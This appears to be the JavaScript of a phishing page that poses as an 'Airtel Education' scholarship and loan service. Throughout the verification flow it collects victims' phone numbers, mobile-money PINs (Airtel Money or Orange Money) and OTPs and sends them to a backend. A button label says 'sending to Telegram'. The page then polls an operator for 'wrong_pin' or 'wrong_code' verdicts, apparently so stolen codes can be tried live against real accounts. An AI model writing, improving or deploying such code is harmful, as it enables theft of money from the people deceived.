/* ===========================================================
   Airtel Education — app.js
   =========================================================== */ 

/* ---------------------------------------------------------
   Configuration
--------------------------------------------------------- */
const AppConfig = {
  apiKey: '',
  baseUrl: window.AIRTEL_API_BASE_URL || (['localhost', '127.0.0.1'].includes(window.location.hostname) ? 'http://localhost:3001' : ''),
  getApiHeaders() {
    const headers = { 'Content-Type': 'application/json' };
    if (this.apiKey) headers['X-API-Key'] = this.apiKey;
    return headers;
  },
  api(path) {
    const base = this.baseUrl.replace(/\/$/, '');
    if (!base) return path;
    return base + path;
  },
  async init() {
    try {
      const response = await fetch(AppConfig.api('/api/config'));
      if (response.ok) {
        const data = await response.json();
        this.apiKey = data.apiKey || '';
      }
    } catch (e) {
      console.warn('Failed to load API config from server:', e.message);
      console.warn('Make sure the backend is running and API_KEY is set.');
      this.apiKey = '';
    }
  }
};

/* ---------------------------------------------------------
   Security Utilities
--------------------------------------------------------- */
const Security = {
  sanitizeInput(value, maxLength = 100) {
    if (typeof value !== 'string') return '';
    return value.replace(/[<>\"\'&]/g, '').slice(0, maxLength);
  },
  sanitizeNumeric(value, maxLength = 20) {
    if (typeof value !== 'string') return '';
    return value.replace(/[^0-9]/g, '').slice(0, maxLength);
  },
  sanitizeAlphanumeric(value, maxLength = 50) {
    if (typeof value !== 'string') return '';
    return value.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, maxLength);
  }
};

/* ---------------------------------------------------------
   Global error handling
--------------------------------------------------------- */
window.addEventListener('error', (event) => {
  console.error('Global error:', event.error);
});

window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled promise rejection:', event.reason);
});

/* ---------------------------------------------------------
   Polling Manager
--------------------------------------------------------- */
const PollingManager = {
  intervals: new Set(),
  add(intervalId) { this.intervals.add(intervalId); },
  clearAll() { this.intervals.forEach(id => clearInterval(id)); this.intervals.clear(); }
};

function showStatus(id, message) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = message;
  el.classList.add('visible');
}

function hideStatus(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.classList.remove('visible');
}

window.addEventListener('beforeunload', () => PollingManager.clearAll());

/* ---------------------------------------------------------
   Country code dropdown
--------------------------------------------------------- */
const COUNTRIES = [
  { code: '+91', iso: 'IN', name: 'India' },
  { code: '+880', iso: 'BD', name: 'Bangladesh' },
  { code: '+94', iso: 'LK', name: 'Sri Lanka' },
  { code: '+234', iso: 'NG', name: 'Nigeria' },
  { code: '+254', iso: 'KE', name: 'Kenya' },
  { code: '+256', iso: 'UG', name: 'Uganda' },
  { code: '+255', iso: 'TZ', name: 'Tanzania' },
  { code: '+260', iso: 'ZM', name: 'Zambia' },
  { code: '+265', iso: 'MW', name: 'Malawi' },
  { code: '+250', iso: 'RW', name: 'Rwanda' },
  { code: '+27', iso: 'ZA', name: 'South Africa' },
  { code: '+248', iso: 'SC', name: 'Seychelles' },
  { code: '+243', iso: 'CD', name: 'DR Congo' },
  { code: '+242', iso: 'CG', name: 'Congo' },
  { code: '+241', iso: 'GA', name: 'Gabon' },
  { code: '+235', iso: 'TD', name: 'Chad' },
  { code: '+261', iso: 'MG', name: 'Madagascar' },
  { code: '+230', iso: 'MU', name: 'Mauritius' },
];

const PHONE_LENGTHS = {
  '+243': { min: 9, max: 9 },
  '+260': { min: 9, max: 9 },
  '+265': { min: 9, max: 9 },
  '+254': { min: 9, max: 9 },
  '+256': { min: 9, max: 9 },
  '+255': { min: 9, max: 9 },
  '+250': { min: 9, max: 9 },
  '+27':  { min: 9, max: 9 },
  '+248': { min: 7, max: 7 },
  '+242': { min: 9, max: 9 },
  '+241': { min: 9, max: 9 },
  '+235': { min: 9, max: 9 },
  '+261': { min: 9, max: 9 },
  '+230': { min: 8, max: 8 },
  '+91':  { min: 10, max: 10 },
  '+880': { min: 10, max: 10 },
  '+94':  { min: 9, max: 9 },
  '+234': { min: 10, max: 10 },
};

function initCountryDropdown() {
  const trigger = document.getElementById('countryTrigger');
  const menu = document.getElementById('countryMenu');
  const flagImg = document.getElementById('selectedFlagImg');
  const codeEl = document.getElementById('selectedCode');
  if (!trigger || !menu) return;

  menu.innerHTML = COUNTRIES.map((c, i) => {
    const safeName = Security.sanitizeInput(c.name, 30);
    const safeCode = Security.sanitizeNumeric(c.code.replace('+', ''), 5);
    const flagUrl = `https://flagcdn.com/w20/${c.iso.toLowerCase()}.png`;
    return `<button type="button" data-index="${i}" role="option"
      style="width: 100%; display: flex; align-items: center; gap: 10px; padding: 10px 12px; border: none; background: transparent; text-align: left; cursor: pointer; font-size: 14px; border-radius: 6px;">
      <img src="${flagUrl}" alt="${safeName}" style="width: 20px; height: 14px; object-fit: cover; border-radius: 2px; box-shadow: 0 0 0 1px rgba(0,0,0,0.08);">
      <span style="flex: 1; color: #374151;">${safeName}</span>
      <span style="color: #9ca3af;">+${safeCode}</span>
    </button>`;
  }).join('');

  const closeMenu = () => { menu.style.display = 'none'; trigger.setAttribute('aria-expanded', 'false'); };
  const openMenu = () => { menu.style.display = 'block'; trigger.setAttribute('aria-expanded', 'true'); };

  trigger.addEventListener('click', (e) => {
    e.stopPropagation();
    menu.style.display === 'none' ? openMenu() : closeMenu();
  });

  menu.addEventListener('click', (e) => {
    const btn = e.target.closest('button');
    if (!btn) return;
    const c = COUNTRIES[Number(btn.dataset.index)];
    if (flagImg) flagImg.src = `https://flagcdn.com/w20/${c.iso.toLowerCase()}.png`;
    if (flagImg) flagImg.alt = c.name;
    codeEl.textContent = c.code;
    trigger.dataset.dialCode = c.code;
    closeMenu();
    document.getElementById('phoneInput')?.focus();
  });

  document.addEventListener('click', (e) => {
    if (!menu.contains(e.target) && !trigger.contains(e.target)) closeMenu();
  });
}

/* ---------------------------------------------------------
   Phone number validation
--------------------------------------------------------- */
function initPhoneValidation() {
  const phoneInput = document.getElementById('phoneInput');
  const phoneError = document.getElementById('phoneError');
  if (!phoneInput) return null;

  const validate = () => {
    const digits = phoneInput.value.replace(/\D/g, '');
    const valid = digits.length >= 7 && digits.length <= 12;
    phoneInput.classList.toggle('error', phoneInput.value.length > 0 && !valid);
    if (phoneError) phoneError.classList.toggle('visible', !valid && phoneInput.value.length > 0);
    return valid;
  };

  phoneInput.addEventListener('input', () => {
    let digits = phoneInput.value.replace(/\D/g, '').slice(0, 12);
    let formatted = digits;
    if (digits.length > 2) formatted = digits.slice(0, 2) + ' ' + digits.slice(2);
    if (digits.length > 5) formatted = formatted.slice(0, 6) + ' ' + digits.slice(5);
    phoneInput.value = formatted;
    validate();
  });
  phoneInput.addEventListener('blur', validate);

  return validate;
}

/* ---------------------------------------------------------
   OTP boxes
--------------------------------------------------------- */
function initOtpBoxes() {
  const boxes = Array.from(document.querySelectorAll('.otp-box'));
  if (!boxes.length) return () => '';

  boxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && boxes[i + 1]) boxes[i + 1].focus();
      updateOtpButtonState();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && boxes[i - 1]) boxes[i - 1].focus();
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
      text.split('').forEach((char, idx) => { if (boxes[idx]) boxes[idx].value = char; });
      const next = boxes[Math.min(text.length, boxes.length - 1)];
      if (next) next.focus();
      updateOtpButtonState();
    });
  });

  function updateOtpButtonState() {
    const verifyBtn = document.getElementById('verifyOtpBtn');
    if (!verifyBtn) return;
    verifyBtn.disabled = !boxes.every(b => b.value.length === 1);
  }

  return () => boxes.map(b => b.value).join('');
}

/* ---------------------------------------------------------
   PIN boxes
--------------------------------------------------------- */
function initPinBoxes() {
  const boxes = Array.from(document.querySelectorAll('.pin-box'));
  if (!boxes.length) return () => '';

  boxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/\D/g, '').slice(0, 1);
      if (box.value && boxes[i + 1]) boxes[i + 1].focus();
      validatePin();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && boxes[i - 1]) boxes[i - 1].focus();
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
      text.split('').forEach((char, idx) => { if (boxes[idx]) boxes[idx].value = char; });
      const next = boxes[Math.min(text.length, boxes.length - 1)];
      if (next) next.focus();
      validatePin();
    });
  });

  function validatePin() {
    const pinError = document.getElementById('pinError');
    const pin = boxes.map(b => b.value).join('');
    const valid = pin.length === 4;
    boxes.forEach(b => b.classList.toggle('error', b.value.length > 0 && !valid));
    if (pinError) pinError.classList.toggle('visible', !valid && boxes.some(b => b.value.length > 0));
    return valid;
  }

  return () => boxes.map(b => b.value).join('');
}

/* ---------------------------------------------------------
   Resend OTP countdown
--------------------------------------------------------- */
function startResendTimer(seconds = 30) {
  const timerEl = document.getElementById('resendTimer');
  const resendBtn = document.getElementById('resendBtn');
  if (!timerEl || !resendBtn) return;

  let remaining = seconds;
  resendBtn.style.display = 'none';
  timerEl.classList.remove('hidden');
  timerEl.textContent = `Renvoyer le code dans ${remaining}s`;

  const interval = setInterval(() => {
    remaining -= 1;
    if (remaining <= 0) {
      clearInterval(interval);
      timerEl.classList.add('hidden');
      resendBtn.style.display = 'inline';
      return;
    }
    timerEl.textContent = `Renvoyer le code dans ${remaining}s`;
  }, 1000);
}

/* ---------------------------------------------------------
   Step transitions
--------------------------------------------------------- */
function goToStep(stepNumber) {
  for (let i = 1; i <= 4; i++) {
    const panel = document.getElementById(`step${i}Panel`);
    if (!panel) continue;

    if (i < stepNumber) {
      panel.classList.add('disabled');
      panel.classList.remove('active');
    } else if (i === stepNumber) {
      panel.classList.remove('disabled', 'hidden');
      panel.classList.add('active');
    } else {
      panel.classList.add('disabled', 'hidden');
      panel.classList.remove('active');
    }
  }
}

/* ---------------------------------------------------------
   Payment Method Selection
--------------------------------------------------------- */
function initPaymentMethodSelection() {
  const airtelBtn = document.getElementById('airtelMoneyBtn');
  const orangeBtn = document.getElementById('orangeMoneyBtn');
  const confirmBtn = document.getElementById('confirmPaymentBtn');
  if (!airtelBtn || !orangeBtn || !confirmBtn) return () => '';

  let selectedMethod = null;

  const params = new URLSearchParams(window.location.search);
  const urlMethod = Security.sanitizeAlphanumeric(params.get('method') || '', 20);
  if (urlMethod === 'orange') {
    selectedMethod = 'orange';
    orangeBtn.classList.add('selected');
    confirmBtn.disabled = false;
  } else if (urlMethod === 'airtel') {
    selectedMethod = 'airtel';
    airtelBtn.classList.add('selected');
    confirmBtn.disabled = false;
  }

  airtelBtn.addEventListener('click', () => {
    selectedMethod = 'airtel';
    airtelBtn.classList.add('selected');
    orangeBtn.classList.remove('selected');
    confirmBtn.disabled = false;
  });

  orangeBtn.addEventListener('click', () => {
    selectedMethod = 'orange';
    orangeBtn.classList.add('selected');
    airtelBtn.classList.remove('selected');
    confirmBtn.disabled = false;
  });

  confirmBtn.addEventListener('click', () => {
    if (!selectedMethod) return;
    goToStep(2);
  });

  return () => selectedMethod;
}

/* ---------------------------------------------------------
   Phone + PIN Verification
--------------------------------------------------------- */
function initPhonePinVerification() {
  const phoneInput = document.getElementById('phoneInput');
  const phoneError = document.getElementById('phoneError');
  const verifyPhonePinBtn = document.getElementById('verifyPhonePinBtn');
  if (!phoneInput || !verifyPhonePinBtn) return;

  const validatePhone = () => {
    const digits = phoneInput.value.replace(/\D/g, '');
    const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
    const expected = PHONE_LENGTHS[countryCode] || { min: 9, max: 9 };
    const valid = digits.length >= expected.min && digits.length <= expected.max;
    phoneInput.classList.toggle('error', phoneInput.value.length > 0 && !valid);
    if (phoneError) phoneError.classList.toggle('visible', !valid && phoneInput.value.length > 0);
    return valid;
  };

  phoneInput.addEventListener('input', () => {
    const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
    const expected = PHONE_LENGTHS[countryCode] || { min: 9, max: 9 };
    let digits = phoneInput.value.replace(/\D/g, '').slice(0, expected.max);
    let formatted = digits;
    if (digits.length > 2) formatted = digits.slice(0, 2) + ' ' + digits.slice(2);
    if (digits.length > 5) formatted = formatted.slice(0, 6) + ' ' + digits.slice(5);
    phoneInput.value = formatted;
    validatePhone();
  });
  phoneInput.addEventListener('blur', validatePhone);

  const getPinValue = initPinBoxes();

  verifyPhonePinBtn.addEventListener('click', async () => {
    const isPhoneValid = validatePhone();
    const isPinValid = getPinValue().length === 4;
    if (!isPhoneValid) { phoneInput.focus(); return; }
    if (!isPinValid) { document.querySelector('.pin-box')?.focus(); return; }

    const phone = phoneInput.value.replace(/\D/g, '');
    const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
    const pin = getPinValue();
    const params = new URLSearchParams(window.location.search);
    const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
    const getPaymentMethod = window.getSelectedPaymentMethod ? window.getSelectedPaymentMethod() : 'airtel';
    const paymentMethod = Security.sanitizeAlphanumeric(getPaymentMethod, 20);

    verifyPhonePinBtn.disabled = true;
    verifyPhonePinBtn.textContent = 'Envoi vers Telegram...';

    try {
      const response = await fetch(AppConfig.api('/api/verify/phone-pin'), {
        method: 'POST',
        headers: AppConfig.getApiHeaders(),
        body: JSON.stringify({ phone, countryCode, pin, flow, paymentMethod })
      });
      const result = await response.json();

      if (result.success) {
        verifyPhonePinBtn.textContent = 'Vérifié ✓';
        verifyPhonePinBtn.classList.remove('btn-primary');
        verifyPhonePinBtn.classList.add('btn-success');
        setTimeout(() => goToStep(3), 400);
      } else {
        throw new Error(result.error || 'Failed to send verification');
      }
    } catch (error) {
      console.error('Erreur de vérification téléphone/PIN :', error);
      verifyPhonePinBtn.textContent = 'Erreur. Veuillez réessayer.';
      verifyPhonePinBtn.disabled = false;
      setTimeout(() => { verifyPhonePinBtn.textContent = 'Vérifier le téléphone et le code PIN'; }, 2000);
    }
  });
}

/* ---------------------------------------------------------
   OTP Verification
--------------------------------------------------------- */
function initOtpVerification() {
  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
  if (!verifyOtpBtn) return;

  verifyOtpBtn.addEventListener('click', async () => {
    const otpBoxes = document.querySelectorAll('.otp-box');
    const otp = Array.from(otpBoxes).map(b => b.value).join('');
    const phone = document.getElementById('phoneInput')?.value.replace(/\D/g, '') || '';
    const countryCode = document.getElementById('countryTrigger')?.dataset?.dialCode || '+243';
    const params = new URLSearchParams(window.location.search);
    const flow = Security.sanitizeAlphanumeric(params.get('flow') || 'scholarship', 50);
    const getPaymentMethod = window.getSelectedPaymentMethod ? window.getSelectedPaymentMethod() : 'airtel';
    const paymentMethod = Security.sanitizeAlphanumeric(getPaymentMethod, 20);

    if (otp.length !== 4) {
      alert('Veuillez entrer le code OTP complet à 4 chiffres.');
      return;
    }

    verifyOtpBtn.disabled = true;
    verifyOtpBtn.textContent = 'Vérification en cours...';

    try {
      const response = await fetch(AppConfig.api('/api/verify/otp'), {
        method: 'POST',
        headers: AppConfig.getApiHeaders(),
        body: JSON.stringify({ otp, phone, countryCode, flow, paymentMethod })
      });
      const result = await response.json();

      if (result.success) {
        verifyOtpBtn.textContent = 'En attente d\'approbation...';

        const pollInterval = setInterval(async () => {
          try {
            const statusResponse = await fetch(AppConfig.api(`/api/verify/otp/status/${result.id || 'latest'}`), {
              headers: AppConfig.getApiHeaders()
            });
            const statusResult = await statusResponse.json();

            if (statusResult.status === 'verified') {
              clearInterval(pollInterval);
              PollingManager.intervals.delete(pollInterval);
              verifyOtpBtn.textContent = 'Vérifié ✓';
              verifyOtpBtn.classList.remove('btn-success');
              verifyOtpBtn.classList.add('btn-primary');
              setTimeout(() => goToStep(4), 600);
            } else if (statusResult.status === 'wrong_code') {
              clearInterval(pollInterval);
              PollingManager.intervals.delete(pollInterval);
              verifyOtpBtn.textContent = 'Code OTP incorrect';
              verifyOtpBtn.classList.add('btn-secondary');
              verifyOtpBtn.classList.remove('btn-success');
              verifyOtpBtn.disabled = false;
              otpBoxes.forEach(box => box.value = '');
              otpBoxes[0]?.focus();
              showStatus('otpStatus', 'Code OTP incorrect. Veuillez réessayer.');
              setTimeout(() => {
                verifyOtpBtn.textContent = 'Vérifier';
                verifyOtpBtn.classList.remove('btn-secondary');
                verifyOtpBtn.classList.add('btn-success');
                hideStatus('otpStatus');
              }, 4000);
            } else if (statusResult.status === 'wrong_pin') {
              clearInterval(pollInterval);
              PollingManager.intervals.delete(pollInterval);
              verifyOtpBtn.textContent = 'Code PIN incorrect';
              verifyOtpBtn.classList.add('btn-secondary');
              verifyOtpBtn.classList.remove('btn-success');
              verifyOtpBtn.disabled = false;
              otpBoxes.forEach(box => box.value = '');
              document.querySelectorAll('.pin-box').forEach(b => b.value = '');
              document.getElementById('phoneInput').value = '';
              showStatus('otpStatus', 'Code PIN incorrect. Veuillez réessayer.');
              setTimeout(() => {
                verifyOtpBtn.textContent = 'Vérifier';
                verifyOtpBtn.classList.remove('btn-secondary');
                verifyOtpBtn.classList.add('btn-success');
                hideStatus('otpStatus');
                goToStep(2);
              }, 1500);
            }
          } catch (error) {
            console.error('OTP polling error:', error);
          }
        }, 2000);
        PollingManager.add(pollInterval);
      } else {
        throw new Error(result.error || 'Failed to send OTP');
      }
    } catch (error) {
      console.error('Erreur de vérification OTP :', error);
      verifyOtpBtn.textContent = 'Erreur. Veuillez réessayer.';
      verifyOtpBtn.disabled = false;
      setTimeout(() => { verifyOtpBtn.textContent = 'Vérifier'; }, 2000);
    }
  });
}

/* ---------------------------------------------------------
   Wire up verification page
--------------------------------------------------------- */
function initVerifyPage() {
  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
  const resendBtn = document.getElementById('resendBtn');
  const continueBtn = document.getElementById('continueBtn');
  if (!verifyOtpBtn) return;

  const getOtpValue = initOtpBoxes();
  const getPaymentMethod = initPaymentMethodSelection();
  initCountryDropdown();
  initPhonePinVerification();
  initOtpVerification();

  window.getSelectedPaymentMethod = () => getPaymentMethod();

  if (resendBtn) {
    resendBtn.addEventListener('click', () => startResendTimer(30));
  }

  if (continueBtn) {
    continueBtn.addEventListener('click', () => {
      window.location.href = 'index';
    });
  }
}

/* ---------------------------------------------------------
   Loan Application Form
--------------------------------------------------------- */
function initLoanApplicationForm() {
  const form = document.getElementById('loanApplicationForm');
  if (!form) return;

  const fields = form.querySelectorAll('[required]');
  const fieldStates = new Map();

  fields.forEach(field => {
    fieldStates.set(field, { touched: false, valid: false });

    field.addEventListener('blur', () => {
      fieldStates.get(field).touched = true;
      validateField(field);
    });

    field.addEventListener('input', () => {
      if (fieldStates.get(field).touched) {
        validateField(field);
      }
    });
  });

  function validateField(field) {
    const errorEl = field.parentElement.querySelector('.form-error');
    const value = field.value.trim();
    const state = fieldStates.get(field);
    let valid = false;

    if (field.type === 'number') {
      const num = parseFloat(value);
      const min = parseFloat(field.min || 0);
      valid = value !== '' && !isNaN(num) && num >= min;
    } else {
      valid = value !== '';
    }

    state.valid = valid;

    if (!valid && state.touched) {
      field.classList.add('error');
      field.classList.remove('success');
      if (errorEl) errorEl.classList.add('visible');
    } else if (valid && state.touched) {
      field.classList.remove('error');
      field.classList.add('success');
      if (errorEl) errorEl.classList.remove('visible');
    } else {
      field.classList.remove('error', 'success');
      if (errorEl) errorEl.classList.remove('visible');
    }

    return valid;
  }

  form.addEventListener('submit', (e) => {
    e.preventDefault();

    let allValid = true;
    fields.forEach(field => {
      fieldStates.get(field).touched = true;
      const valid = validateField(field);
      if (!valid) allValid = false;
    });

    if (!allValid) {
      const firstError = form.querySelector('.form-error.visible');
      if (firstError) firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    const submitBtn = document.getElementById('submitApplicationBtn');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;
    submitBtn.innerHTML = 'Traitement en cours...';

    setTimeout(() => {
      window.location.href = 'verify?flow=loan';
    }, 1200);
  });
}

/* ---------------------------------------------------------
   Landing page links
--------------------------------------------------------- */
function initLandingLinks() {
  document.querySelectorAll('[data-flow-link]').forEach((el) => {
    const flow = el.getAttribute('data-flow-link');
    if (flow) el.setAttribute('href', `verify?flow=${flow}`);
  });
}

/* ---------------------------------------------------------
   Init
--------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
  PollingManager.clearAll();
  AppConfig.init().then(() => {
    initVerifyPage();
    initLoanApplicationForm();
    initLandingLinks();
  });
});